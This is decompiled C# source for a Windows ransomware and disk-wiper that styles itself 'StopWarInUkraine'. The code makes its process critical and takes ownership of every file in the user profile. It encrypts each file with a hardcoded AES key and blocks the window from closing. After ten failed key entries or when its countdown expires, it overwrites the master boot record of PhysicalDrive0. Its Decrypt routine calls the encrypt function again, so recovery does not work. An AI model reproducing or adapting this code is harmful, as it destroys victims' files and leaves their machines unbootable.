using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;
using lockuiransow.Properties;

namespace lockuiransow;

public class Form1 : Form
{
	private int attempts = 10;

	private int ile = 10;

	private int m = 0;

	private int delay = 3600;

	private const uint GenericAll = 268435456u;

	private const uint FileShareRead = 1u;

	private const uint FileShareWrite = 2u;

	private const uint OpenExisting = 3u;

	private const uint MbrSize = 512u;

	private IContainer components = null;

	private Label label1;

	private PictureBox pictureBox1;

	private PictureBox pictureBox2;

	private Label label2;

	private Label label3;

	private Label app;

	private Label timer;

	private TextBox textBox1;

	private Button button1;

	private Label label4;

	private Button button2;

	private Timer time_timer;

	public Form1()
	{
		InitializeComponent();
	}

	private void MakeCritical()
	{
		int processInformation = 1;
		NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref processInformation, 4);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		MakeCritical();
		((Control)this).Hide();
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\StopWarInUkraineLocker");
		if (registryKey.GetValue("EncryptedFiles") == null)
		{
			Encrypt();
			registryKey.SetValue("EncryptedFiles", 1, RegistryValueKind.DWord);
		}
		((Control)this).Show();
		time_timer.Start();
	}

	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

	private void Encrypt()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
		EncryptFiles(folderPath);
	}

	private void EncryptFiles(string Path)
	{
		string[] files = Directory.GetFiles(Path);
		foreach (string text in files)
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.FileName = "takeown.exe";
			processStartInfo.Arguments = "/f " + text;
			Process.Start(processStartInfo)!.WaitForExit();
			try
			{
				FileSecurity accessControl = File.GetAccessControl(text);
				accessControl.AddAccessRule(new FileSystemAccessRule(WindowsIdentity.GetCurrent().User, FileSystemRights.FullControl, AccessControlType.Allow));
				File.SetAccessControl(text, accessControl);
			}
			catch (Exception)
			{
				throw;
			}
			EncryptFile(text, text + ".freeukraine");
		}
		string[] directories = Directory.GetDirectories(Path);
		foreach (string path in directories)
		{
			try
			{
				EncryptFiles(path);
			}
			catch (Exception)
			{
				throw;
			}
		}
	}

	private void DecryptFiles(string Path)
	{
		string[] files = Directory.GetFiles(Path, "*.freeukraine");
		foreach (string text in files)
		{
			DecryptFile(text, text.Remove(text.Length - 12, 12));
		}
		string[] directories = Directory.GetDirectories(Path);
		foreach (string path in directories)
		{
			try
			{
				DecryptFiles(path);
			}
			catch (Exception)
			{
				throw;
			}
		}
	}

	private void Decrypt()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
		EncryptFiles(folderPath);
	}

	private void EncryptFile(string inputFile, string outputFile)
	{
		try
		{
			string s = "lockfile";
			UnicodeEncoding unicodeEncoding = new UnicodeEncoding();
			byte[] bytes = unicodeEncoding.GetBytes(s);
			FileStream fileStream = new FileStream(outputFile, FileMode.Create);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(bytes, bytes), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Close();
			cryptoStream.Close();
			fileStream.Close();
		}
		catch
		{
		}
	}

	private void DecryptFile(string inputFile, string outputFile)
	{
		try
		{
			string s = "lockfile";
			UnicodeEncoding unicodeEncoding = new UnicodeEncoding();
			byte[] bytes = unicodeEncoding.GetBytes(s);
			FileStream fileStream = new FileStream(inputFile, FileMode.Open);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateDecryptor(bytes, bytes), CryptoStreamMode.Read);
			FileStream fileStream2 = new FileStream(outputFile, FileMode.Create);
			int num;
			while ((num = cryptoStream.ReadByte()) != -1)
			{
				fileStream2.WriteByte((byte)num);
			}
			fileStream2.Close();
			cryptoStream.Close();
			fileStream.Close();
		}
		catch
		{
		}
	}

	private void label1_Click(object sender, EventArgs e)
	{
	}

	private void textBox1_TextChanged(object sender, EventArgs e)
	{
	}

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool CloseHandle(IntPtr hHandle);

	[DllImport("kernel32")]
	private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

	[DllImport("kernel32")]
	private static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);

	public void MBR()
	{
		byte[] lpBuffer = new byte[512];
		IntPtr intPtr = CreateFile("\\\\.\\PhysicalDrive0", 268435456u, 3u, IntPtr.Zero, 3u, 0u, IntPtr.Zero);
		try
		{
			WriteFile(intPtr, lpBuffer, 512u, out var _, IntPtr.Zero);
			CloseHandle(intPtr);
		}
		catch
		{
		}
	}

	private void button1_Click(object sender, EventArgs e)
	{
		if (((Control)textBox1).get_Text().ToLower() == "stopwarinukraine")
		{
			m++;
			if (m == ile)
			{
				((Control)button2).set_Enabled(true);
			}
			return;
		}
		m = 0;
		attempts--;
		((Control)app).set_Text("Attempts: " + attempts);
		if (attempts == 0)
		{
			MBR();
			Environment.Exit(-1);
		}
	}

	private void Window_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void button2_Click(object sender, EventArgs e)
	{
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey.SetValue("DisableTaskmgr", 0, RegistryValueKind.DWord);
		registryKey.SetValue("DisableRegistryTools", 0, RegistryValueKind.DWord);
		registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey.SetValue("EnableLUA", 1, RegistryValueKind.DWord);
		registryKey.SetValue("legalnoticecaption", "", RegistryValueKind.String);
		registryKey.SetValue("legalnoticetext", "", RegistryValueKind.String);
		registryKey.Close();
		registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
		registryKey.SetValue("userinit", "userinit.exe");
		registryKey.Close();
		registryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\System");
		registryKey.SetValue("DisableCmd", 0, RegistryValueKind.DWord);
		registryKey.Close();
		registryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
		registryKey.SetValue("NoControlPanel", 0, RegistryValueKind.DWord);
		registryKey.SetValue("NoRun", 0, RegistryValueKind.DWord);
		registryKey.SetValue("NoWinKeys", 0, RegistryValueKind.DWord);
		registryKey.Close();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "shutdown.exe";
		processStartInfo.Arguments = "-r -t 0";
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		Decrypt();
		Process.Start(processStartInfo);
	}

	private void time_timer_Tick(object sender, EventArgs e)
	{
		if (delay >= 0)
		{
			TimeSpan timeSpan = TimeSpan.FromSeconds(--delay);
			((Control)timer).set_Text(timeSpan.ToString("hh\\:mm\\:ss"));
		}
		else
		{
			MBR();
			Environment.Exit(-1);
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_008b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Expected O, but got Unknown
		//IL_024f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0259: Expected O, but got Unknown
		//IL_02d9: Unknown result type (might be due to invalid IL or missing references)
		//IL_02e3: Expected O, but got Unknown
		//IL_0363: Unknown result type (might be due to invalid IL or missing references)
		//IL_036d: Expected O, but got Unknown
		//IL_03e7: Unknown result type (might be due to invalid IL or missing references)
		//IL_03f1: Expected O, but got Unknown
		//IL_04dc: Unknown result type (might be due to invalid IL or missing references)
		//IL_04e6: Expected O, but got Unknown
		//IL_0586: Unknown result type (might be due to invalid IL or missing references)
		//IL_0590: Expected O, but got Unknown
		//IL_0795: Unknown result type (might be due to invalid IL or missing references)
		//IL_079f: Expected O, but got Unknown
		//IL_07a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_07d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_07da: Expected O, but got Unknown
		components = new Container();
		label1 = new Label();
		pictureBox1 = new PictureBox();
		pictureBox2 = new PictureBox();
		label2 = new Label();
		label3 = new Label();
		app = new Label();
		timer = new Label();
		textBox1 = new TextBox();
		button1 = new Button();
		label4 = new Label();
		button2 = new Button();
		time_timer = new Timer(components);
		((ISupportInitialize)pictureBox1).BeginInit();
		((ISupportInitialize)pictureBox2).BeginInit();
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Location(new Point(502, 9));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(432, 33));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("StopWarInUkraine Ransowmare");
		((Control)label1).add_Click((EventHandler)label1_Click);
		pictureBox1.set_Image((Image)(object)Resources.UkraineFlag);
		pictureBox1.set_InitialImage((Image)(object)Resources.UkraineFlag);
		((Control)pictureBox1).set_Location(new Point(266, 9));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(93, 54));
		pictureBox1.set_SizeMode((PictureBoxSizeMode)1);
		pictureBox1.set_TabIndex(1);
		pictureBox1.set_TabStop(false);
		pictureBox2.set_Image((Image)(object)Resources.UkraineFlag);
		pictureBox2.set_InitialImage((Image)(object)Resources.UkraineFlag);
		((Control)pictureBox2).set_Location(new Point(1059, 9));
		((Control)pictureBox2).set_Name("pictureBox2");
		((Control)pictureBox2).set_Size(new Size(100, 54));
		pictureBox2.set_SizeMode((PictureBoxSizeMode)1);
		pictureBox2.set_TabIndex(2);
		pictureBox2.set_TabStop(false);
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)label2).set_Location(new Point(481, 61));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(483, 200));
		((Control)label2).set_TabIndex(3);
		((Control)label2).set_Text("Your all files in encrypted.\r\n\r\nHow to decrypt files??\r\nWrite \"StopWarInUkraine\" 10 times in the key box\r\n\r\nYou have a week to enter.\r\n\r\nStop war in ukraine.");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)label3).set_Location(new Point(1309, 878));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(195, 25));
		((Control)label3).set_TabIndex(4);
		((Control)label3).set_Text("Author: CyberWord");
		((Control)app).set_AutoSize(true);
		((Control)app).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)app).set_Location(new Point(12, 392));
		((Control)app).set_Name("app");
		((Control)app).set_Size(new Size(100, 20));
		((Control)app).set_TabIndex(5);
		((Control)app).set_Text("Attempts: 10");
		((Control)timer).set_AutoSize(true);
		((Control)timer).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)timer).set_Location(new Point(12, 421));
		((Control)timer).set_Name("timer");
		((Control)timer).set_Size(new Size(126, 20));
		((Control)timer).set_TabIndex(6);
		((Control)timer).set_Text("Time: 7:00:00:00");
		((Control)textBox1).set_BackColor(Color.SeaGreen);
		((Control)textBox1).set_Location(new Point(74, 737));
		((TextBoxBase)textBox1).set_Multiline(true);
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(772, 36));
		((Control)textBox1).set_TabIndex(7);
		((Control)textBox1).add_TextChanged((EventHandler)textBox1_TextChanged);
		((Control)button1).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)button1).set_Location(new Point(852, 737));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(75, 39));
		((Control)button1).set_TabIndex(8);
		((Control)button1).set_Text("Check");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)label4).set_Location(new Point(13, 745));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(54, 15));
		((Control)label4).set_TabIndex(9);
		((Control)label4).set_Text("Key Box:");
		((Control)button2).set_Enabled(false);
		((Control)button2).set_Location(new Point(490, 779));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(474, 68));
		((Control)button2).set_TabIndex(10);
		((Control)button2).set_Text("Decrypt");
		((ButtonBase)button2).set_UseVisualStyleBackColor(true);
		((Control)button2).add_Click((EventHandler)button2_Click);
		time_timer.add_Tick((EventHandler)time_timer_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(17f, 33f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.MediumSeaGreen);
		((Form)this).set_ClientSize(new Size(1516, 912));
		((Control)this).get_Controls().Add((Control)(object)button2);
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)timer);
		((Control)this).get_Controls().Add((Control)(object)app);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)pictureBox2);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).set_Font(new Font("Microsoft Sans Serif", 21.75f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Margin(new Padding(8));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Form1");
		((Form)this).add_FormClosing(new FormClosingEventHandler(Window_FormClosing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		((ISupportInitialize)pictureBox1).EndInit();
		((ISupportInitialize)pictureBox2).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
